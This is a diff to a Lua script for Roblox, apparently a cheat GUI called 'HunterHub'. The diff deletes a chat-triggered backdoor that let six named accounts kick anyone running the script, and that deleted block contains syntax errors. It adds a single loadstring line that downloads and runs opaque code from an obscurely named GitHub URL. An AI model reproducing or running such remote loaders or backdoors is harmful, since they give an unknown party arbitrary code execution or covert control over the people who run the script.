@@ -1873,35 +1873,4 @@ sendNotification("HunterHub", "Welcome to HunterHub Gui")
 
 --------------
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local authorizedUsers = {
-    ["QT_xAraa"] = true,
-    ["shot16kill"] = true,
-    ["philippinesBraxy123"] = true
-	["Brxy_Alt"] = true
-	["Bowmbaclaat"] = true
-	["Drenvoryth"] = true
-}
-
-local function onChatMessage(player, message)
-    if authorizedUsers[player.Name] then
-        local match = message:lower():match(">/%s*kick%s+([%w_]+)")
-        if match and LocalPlayer.Name:lower():find(match) then
-            LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
-        end
-    end
-end
-
-local function setupPlayerChat(player)
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    setupPlayerChat(player)
-end
-
-Players.PlayerAdded:Connect(setupPlayerChat)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/73929640927736263799/234523654645756754765/refs/heads/main/4565465474576456456'))()
